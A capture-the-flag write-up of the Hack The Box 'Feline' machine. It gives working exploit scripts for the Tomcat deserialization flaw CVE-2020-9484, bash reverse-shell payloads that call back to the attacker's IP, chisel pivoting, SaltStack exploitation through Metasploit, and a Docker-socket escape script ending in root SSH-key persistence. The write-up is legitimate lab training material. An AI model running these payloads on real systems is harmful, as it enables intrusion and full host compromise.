[Feline](https://www.hackthebox.eu/home/machines/profile/274) is a hard linux box by [MinatoTW](https://www.hackthebox.eu/home/users/profile/8308) & [MrR3boot](https://www.hackthebox.eu/home/users/profile/13531). 

### Overview

The box starts with web-enumeration, where we an installation of Tomcat that is vulnerable to a deserialization attack. Using the upload-functionality of the website, we are able to leak the upload-directory. Using this information, we create a malicious deserialization payload, which we upload and access using the vulnerability to get a shell.

Enumerating the system, we find that there is a docker-container in our network. Using chisel to setup a socks-proxy, we are able to enumerate the container. A nmap-scan shows that ZeroMQ (SaltStack) is running on the container. Using Metasploit, we get a shell on the docker-container as root.

Enumerating the docker-container, we find that we have access to the Docker-API. Using this access, we create a docker-container that has the file-system of the host-machine mounted. Using socat, we can access the container and spawn a shell. Accessing the mounted file-system, we can read write our ssh-key into root's authorized_keys-file and read root.txt.

## Information Gathering

### Nmap
We begin our enumeration with a nmap scan for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.205
Nmap scan report for 10.10.10.205
Host is up (0.21s latency).

|_http-open-proxy: Proxy might be redirecting requests
|_http-title: VirusBucket
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

The open ports shown are **22** (ssh) and **8080** (http). According to nmap, Apache Tomcat version 9.0.27 is running on port 8080. As ssh is not really interesting without credentials, let us start our enumeration with port 8080.

### Tomcat exploit search

As we already know the version of Tomcat (9.0.27), let us do a quick [Google search](https://www.google.com/search?&q=Apache+Tomcat+9.0.27+exploit) and see if there are any published exploits. This leads us to an [article](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/) about a Tomcat RCE vulnerability ([CVE-2020-9484](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484)). According to this, if certain prerequisites are met, an attack can use the JSESSIONID cookie to force Tomcat to deserialize a previously uploaded payload, resulting into RCE.

The Prerequisites according to the article are:

1. The `PersistentManager` is enabled and itâ€™s using a `FileStore`
2. The attacker is able to upload a file with arbitrary content, has control over the filename and knows the location where it is uploaded
3. There are gadgets in the `classpath` that can be used for a Java deserialization attack

Let us keep these three points in mind, as they may be useful later on.

### HTTP - Port 8080

Visiting http://10.10.10.205:8080, gives us following webpage:

![Index webpage](/assets/htb/Feline/http/index-webpage.png)

Checking out the menu-tabs, `Service` leads to http://10.10.10.205:8080/service/:

![Service webpage](/assets/htb/Feline/http/service-webpage.png)

Seems like we can upload files here. Let us use Burp to intercept an upload request and see what is going on. 

#### File-upload enumeration

First, let us not specify any data and simply press the `Analyze!` button.

This results into following request being issued:

![Empty upload](/assets/htb/Feline/http/burp/upload-empty-req.png)

As a response, we get following output:

![Upload ok](/assets/htb/Feline/http/burp/upload-ok-resp.png)

Interestingly, we get a `File uploaded successfully!` without specifying any file.

Next, let us upload a simple text-file and see what the behavior is.

As expected the request looks as follows:

![Text-file upload](/assets/htb/Feline/http/burp/upload-txt-req.png)

We get the same response as before:

![Upload ok](/assets/htb/Feline/http/burp/upload-ok-resp.png)

After a bit of trying around, I eventually came across the idea to change the filename to be empty.

![](/assets/htb/Feline/http/burp/upload-fname-empty-req.png)

As a response we do not get the expected `File uploaded successfully!` , but instead a java exception:

![Java exception leaks upload-directory](/assets/htb/Feline/http/burp/upload-err-resp.png)

Seems like we have successfully leaked the upload directory (`/opt/samples/uploads/`).

If we remember back to the prerequisites, we have now successfully fulfilled point 2:

"The attacker is able to **upload a file with arbitrary content**, has **control over the filename** and **knows the location** where it is uploaded".

## Exploiting CVE-2020-9484

In order to exploit CVE-2020-9484, we simply have to do following steps:

1. Create a deserialization payload using [ysoserial](https://github.com/frohoff/ysoserial)
2. Upload the deserialization payload
3. Use the CVE to access the deserialization payload and trigger code-execution

Let us go through each step in detail:

1.Creation of deserialization payload

The deserialization payload can be created by [ysoserial](https://github.com/frohoff/ysoserial) with the CommonsCollections2 as the selected payload. Then we simply supply any command to be executed and write that to a file (in our case payload.session).

```bash
root@darkness:~# java -jar /opt/ysoserial.jar CommonsCollections2 `cmd` > payload.session
```

2.Upload the deserialization payloads

The payload can be quickly uploaded using curl with the `-F` option as shown below.

```bash
root@darkness:~# curl 'http://10.10.10.205:8080/upload.jsp' -F 'image=@payload.session'
```

3.Use the vulnerability to trigger RCE

In order to trigger the RCE, we simply have to do another upload-request, however, this time we additionally add the JSESSIONID cookie that points to the location of our uploaded payload.

```bash
root@darkness:~# curl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/payload' -F 'image=@payload.session'
```

### Bash exploit-script

As the exploit-process can be done in only a few commands, a bash-script comes handy to exploit the vulnerability.

```bash
#!/bin/bash
payload=$(echo -n "$1" | base64) # base64-encode payload
cmd="bash -c {echo,$payload}|{base64,-d}|bash"
java -jar /opt/ysoserial.jar CommonsCollections2 "$cmd" > payload.session 2>/dev/null
curl -s 'http://10.10.10.205:8080/upload.jsp' -F 'image=@payload.session' >/dev/null
curl -s 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/payload' -F 'image=@payload.session' >/dev/null
```

### Python exploit-script

Because automation with python is fun, I also created a [python-script](https://github.com/chr0x6eos/HTB/blob/master/Feline/exploit.py) to automatically exploit the vulnerability. For this we create a couple of functions that do the same three steps we did earlier.

1.Generate the deserialization payload

{% raw %}
```python
# Generate deserialization payload
def gen_payload(cmd:str="") -> None:
    '''
    Generates a bash-reverse-shell payload using ysoserial.jar
    '''
    if cmd == "":
        rev = b64encode(f"bash -i >& /dev/tcp/{get_ip()}/443 0>&1".encode()).decode()
        cmd = f"bash -c {{echo,{rev}}}|{{base64,-d}}|{{bash,-i}}"
    system(f'java -jar /opt/ysoserial.jar CommonsCollections2 "{cmd}" > payload.session 2>/dev/null')
```
{% endraw %}

2.&3.Upload and trigger the exploit

```python
# Upload file & trigger payload
def trigger(path:str, cmd:str="") -> None:
    '''
    Uploads specified file and triggers payload
    '''
    fname = ''.join(choice(ascii_letters) for i in range(8))
    gen_payload(cmd)
    location = f'../../../../..{path}/{fname}'
    print(f"[*] Accessing payload: {location}")
    cookie = {'JSESSIONID':location}
    [requests.post(f"{url}/upload.jsp?email=chronos", cookies=cookie, files={"image":(f"{fname}.session", open("payload.session","rb"))}, proxies=proxies) for x in range(2)]
```

Additionally, we also have a function that leaks the upload-path:

```python
# Trigger exception to leak file-location
def get_location() -> str:
    ''' 
    Upload file with empty name to leak directory
    '''
    r = requests.post(f"{url}/upload.jsp?email=chronos",files={"image" : ("", "bla")}, proxies=proxies)
    return findall(r"FileNotFoundException: (.*?) ",r.text)[0]
```

All the functions come together in the main-function:

```python
if __name__ == "__main__":
    # 1.) Leak upload-path by uploading image
    leaked_path = get_location()
    print(f"[+] Upload path leaked: {leaked_path}!")
    # 2.) Upload deserialization payload
    trigger(leaked_path)
    remove("payload.session") # cleanup
```

### Getting a shell as tomcat

Now that we have automated the exploitation, let us run the scripts to get a shell.

```bash
root@darkness:~# python3 exploit.py 
[+] Upload path leaked: /opt/samples/uploads!
[*] Accessing payload: ../../../../../opt/samples/uploads/mXRyRykH
root@darkness:~# bash user.sh "bash -i >& /dev/tcp/10.10.14.15/443 0>&1" # Bash exploit
```

We get a shell back to our listener.

```bash
root@darkness:~# nc -lvnp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.205.
Ncat: Connection from 10.10.10.205:53278.
bash: cannot set terminal process group (926): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@VirusBucket:/opt/tomcat$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<cat$ python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@VirusBucket:/opt/tomcat$ ^Z
[1]+  Stopped                 nc -lvnp 443
root@darkness:~# stty raw -echo
tomcat@VirusBucket:/opt/tomcat$ export TERM=xterm
```

Now we quickly use python to upgrade our shell and we can go to our home-directory and read user.txt.

```bash
tomcat@VirusBucket:~$ cat user.txt 
3cc50***************************
```

## Privesc - Root

Now that we have user, let us enumerate the system to find a privesc-vector to root.

### Enumeration as tomcat

After searching around a bit, checking our ip-neighbor, we can that there is another system on the network.

```bash
tomcat@VirusBucket:~$ ip neigh
172.17.0.2 dev docker0 lladdr 02:42:ac:11:00:02 REACHABLE
10.10.10.2 dev ens160 lladdr 00:50:56:b9:3a:6a REACHABLE
fe80::250:56ff:feb9:3a6a dev ens160 lladdr 00:50:56:b9:3a:6a router STALE
```

Seems like there is a docker-host (IP 172.17.0.2) in our network.

Let us download [chisel](https://github.com/jpillora/chisel) and setup a SOCKS-proxy to start scanning the docker-container.

### Setting up chisel

First, we download the [latest release of the chisel binary](https://github.com/jpillora/chisel/releases) (Version 1.7.3 at writing of this writeup). Then we start the binary in server mode and listen for connection on port 8000.

```bash
root@darkness:~# chisel server -p 8000 --reverse
2021/01/11 14:24:41 server: Reverse tunnelling enabled
2021/01/11 14:24:41 server: Fingerprint 3k+Mt9GiG/RDBbtHmVYGz5LFo1KXfNRssAaM0KBKKXY=
2021/01/11 14:24:41 server: Listening on http://0.0.0.0:8000
```

Next, let us download the binary to the server.

```bash
tomcat@VirusBucket:/dev/shm$ wget 10.10.14.15/chisel
--2021-01-11 13:33:23--  http://10.10.14.15/chisel

```

```bash
root@darkness:/opt/chisel# python3 -m http.server 80

10.10.10.205 - - [11/Jan/2021 14:27:47] "GET /chisel HTTP/1.1" 200 -
```

We successfully download the binary from our server. Let us run the binary to setup the SOCKS-tunnel.

```bash
tomcat@VirusBucket:/dev/shm$ chmod +x chisel
tomcat@VirusBucket:/dev/shm$ ./chisel client 10.10.14.15:8000 R:socks
2021/01/11 13:34:56 client: Connecting to ws://10.10.14.15:8000
2021/01/11 13:34:57 client: Connected (Latency 50.198732ms)
```

We also get a connection back on our server:

```bash
root@darkness:~# chisel server -p 8000 --reverse
2021/01/11 14:24:41 server: Reverse tunnelling enabled
2021/01/11 14:24:41 server: Fingerprint 3k+Mt9GiG/RDBbtHmVYGz5LFo1KXfNRssAaM0KBKKXY=
2021/01/11 14:24:41 server: Listening on http://0.0.0.0:8000
2021/01/11 14:29:21 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Finally, we have to add this line to the end of our /etc/proxychains.conf file:

```bash
root@darkness:~# tail -n 1 /etc/proxychains.conf 
socks5 127.0.0.1 1080
```

With this done, we have completed our SOCKS-proxy setup and can now route our traffic to the internal network.

### Enumeration of the internal network

Let us start the enumeration with a quick port-scan. We can do this either with nmap or with this bash-script I created:

```bash
#!/bin/bash
HOST="$1"
for PORT in $(seq 0 65535);
 do
         #Proxychains -q for quiet mode
         proxychains -q nc -z $HOST $PORT; # Connect to $HOST through the proxy
         if [[ $? -eq 0 ]]; # Port open
          then
                  echo "$HOST:$PORT is open!";
         fi
 done
```

Let us first run this scan to find open ports and then use nmap to enumerate them.

```bash
root@darkness:~# bash portscan.sh 172.17.0.2
172.17.0.2:22 is open!
172.17.0.2:4505 is open!
172.17.0.2:4506 is open!
172.17.0.2:8000 is open!
```

After a while, we have found four open ports that we can scan with nmap. As we are tunneling through the SOCKS-proxy, we have to set a couple of nmap-options for it to work. As NMAP does only support TCP through proxies, we have to disable pings (ICMP-packets not supported).

```
-sT ... TCP connect scan
-n  ... No DNS resolution
-Pn ... No ping (Host discovery)
```



```bash
root@darkness:~# proxychains -q nmap -sC -sV -sT -n -Pn 172.17.0.2 -p 4505,4506,8000
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Nmap scan report for 172.17.0.2
Host is up (0.15s latency).

PORT     STATE SERVICE  VERSION
4505/tcp open  zmtp     ZeroMQ ZMTP 2.0

```

Seems like port 4505 and 4506 are running ZeroMQ and port 8000 is running CherryPy.  After a bit of research, I found that SaltStack is using ZeroMQ as the default transport protocol. Furthermore, there seems to be a [Metasploit-module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/misc/saltstack_salt_unauth_rce.rb) available. Let us try to exploit SaltStack using Metasploit.

### Exploiting SaltStack using Metasploit

Searching for ZeroMQ or SaltStack, both shows following exploit:

```ruby
msf6 > search ZeroMQ

We can now use the meterpreter command `shell` to get a shell on the system.

```bash
meterpreter > shell
Process 3664 created.
Channel 1 created.
/bin/sh: 0: can\'t access tty; job control turned off
$ id && hostname
uid=0(root) gid=0(root) groups=0(root)
2d24bf61767c
```

We get a shell on the container (hostname: 2d24bf61767c) as root. Now let us enumerate the container to find a way to escape the container and get a root shell on the host-system.

### Enumerating the docker-container

Let us first checkout the home-directory of the root user.

```bash
root@2d24bf61767c:~# ls -alh
total 28K
drwx------ 1 root root 4.0K Jun 30  2020 .
drwxr-xr-x 1 root root 4.0K Jun 30  2020 ..
-rw------- 1 root root 1.4K Jun 30  2020 .bash_history
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxr-xr-x 2 root root 4.0K May  3  2020 .ssh
-rw-r--r-- 1 root root  137 Jun 30  2020 todo.txt
```

Two files stand out to me: `.bash_history` (as it is not empty) and `todo.txt`. Let us read todo.txt first.

```bash
root@2d24bf61767c:~# cat todo.txt 
- Add saltstack support to auto-spawn sandbox dockers through events.
- Integrate changes to tomcat and make the service open to public.
```

Seems like our container running SaltStack should eventually be able to spawn docker containers. Let us check out the history file next.

```bash
root@2d24bf61767c:~# cat .bash_history 
[...] 
ls -la /var/run/
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
exit
```

The last couple of lines are the most interesting. Seems like the root user previously communicated with the Docker API using the docker-socket. Let us enumerate docker next

### Exploiting the Docker-API

After a bit of research, I found [this article](https://blog.secureideas.com/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html), which explains how we can exploit our current setup to have read & write access to the host-fs. In order to do so, we have to do following steps:

1. Find an available docker-image we can use
2. Create a container with the host-filesystem mounted into the container
3. Start the container
4. Upgrade the container, so we can send input&output
5. Access the host-fs

Let us begin by listing all available images:

```bash
root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | python -m json.tool
[
    {
        "Containers": -1,
        "Created": 1590787186,
        "Id": "sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e",
        "Labels": null,
        "ParentId": "",
        "RepoDigests": null,
        "RepoTags": [
            "sandbox:latest"
        ],
        "SharedSize": -1,
        "Size": 5574537,
        "VirtualSize": 5574537
    },
    {
        "Containers": -1,
        "Created": 1588544489,
        "Id": "sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9",
        "Labels": null,
        "ParentId": "",
        "RepoDigests": [
            "<none>@<none>"
        ],
        "RepoTags": [
            "<none>:<none>"
        ],
        "SharedSize": -1,
        "Size": 1056679100,
        "VirtualSize": 1056679100
    }
]
```

Seems like there is a image called `sandbox:latest` available. Next, let us create the container. For this, we first write a json file (ease of use) and then make our requests to the API.

The json data looks as follows:

```json
{
    "Image": "sandbox",
    "Cmd": [
        "/bin/sh"
    ],
    "DetachKeys": "Ctrl-p,Ctrl-q",
    "OpenStdin": true,
    "Mounts": [
        {
            "Type": "bind",
            "Source": "/", # Host-fs root-directory
            "Target": "/mnt/host" # Specifying that the Source (Host-fs root dir) should be mounted into /mnt/host 
        }
    ]
}
```

Let us write this json data to a file.

```bash
root@2d24bf61767c:~# echo -e '{"Image":"sandbox","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/mnt/host"}]}' > container.json
```

Next, we create the container, specified by the json-data.

```bash
root@2d24bf61767c:~# curl -s -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d "$(cat container.json)" http://localhost/containers/create
{"Id":"d4037330826e91b4dae09e68fb97e6233ae04a8069b53a364c3f7d2dab72e633","Warnings":[]}
```

We have successfully created the container. We need to save the ID for later usage.

Next, we start the container.

```bash
root@2d24bf61767c:~# curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/d4037330826e91b4dae09e68fb97e6233ae04a8069b53a364c3f7d2dab72e633/start
```

Now in order to interact with the container, we need to install [socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat), we can get a statically build version from [this GitHub](https://github.com/andrew-d/static-binaries).

```bash
root@2d24bf61767c:~# wget 10.10.14.15/socat
--2021-01-11 14:39:54--  http://10.10.14.15/socat
Connecting to 10.10.14.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: â€˜socatâ€™

socat		100%[==============>] 366.38K   688KB/s    in 0.5s    

2021-01-11 14:39:55 (688 KB/s) - â€˜socatâ€™ saved [375176/375176]
```

Now for the final step, we have to upgrade the container using following commands:

```bash
root@2d24bf61767c:~# ./socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/67c5e15fc936ef386d69ac89829ee823ee0375ecd5afc0ecde3ee9056b0815c1/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

HTTP/1.1 101 UPGRADED
Content-Type: application/vnd.docker.raw-stream
Connection: Upgrade
Upgrade: tcp

id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

We get 101 UPGRADED as a response and can now executed bash commands. Now we simply have to navigate to `/mnt/host` and we have full access to the file-system of the host.

```bash
cd /mnt/host
ls
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swap.img
sys
tmp
usr
var
```

Because this process takes some time and the container gets killed eventually, I created a bash-script to automate the process.

```bash
#!/bin/bash

# Define container with json-file
echo -e '{"Image":"sandbox","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/mnt/host"}]}' > container.json

# Create container and get ID
ID=$(curl -s -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d "$(cat container.json)" http://localhost/containers/create | sed -e 's/{"Id":"//' | sed -e 's/",.*//')
# Start container
curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$ID/start
# Upgrade container and drop into shell
(echo -e "POST /containers/$ID/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp \n"; cat) | ./socat - UNIX-CONNECT:/var/run/docker.sock
```

Now we simply have to download and run the exploit.

```bash
root@2d24bf61767c:~# wget -q 10.10.14.15/exploit.sh; bash exploit.sh
HTTP/1.1 101 UPGRADED
Content-Type: application/vnd.docker.raw-stream
Connection: Upgrade
Upgrade: tcp

ls /mnt/host/root/
root.txt
snap
cat /mnt/host/root/root.txt
!20898***************************
```

We can now access the file-system of the host and read root.txt.

#### Root shell

In order to get root-shell on the machine, we have to write our ssh-key into root's authorized_keys.

First we generate our ssh-key.

```bash
root@darkness:~# ssh-keygen -f feline.key -N "" -q
```

Then we execute our exploit again and write the generated key into `/mnt/host/root/.ssh/authorized_keys`.

```bash
root@2d24bf61767c:~# bash exploit.sh
HTTP/1.1 101 UPGRADED
Content-Type: application/vnd.docker.raw-stream
Connection: Upgrade
Upgrade: tcp

echo 'ssh-rsa AAAA[...]OUlq3ueek=' > /mnt/host/root/.ssh/authorized_keys
```

Now we simply have to ssh into the machine using the generated key.

```bash
root@darkness:~# ssh -i feline.key root@10.10.10.205
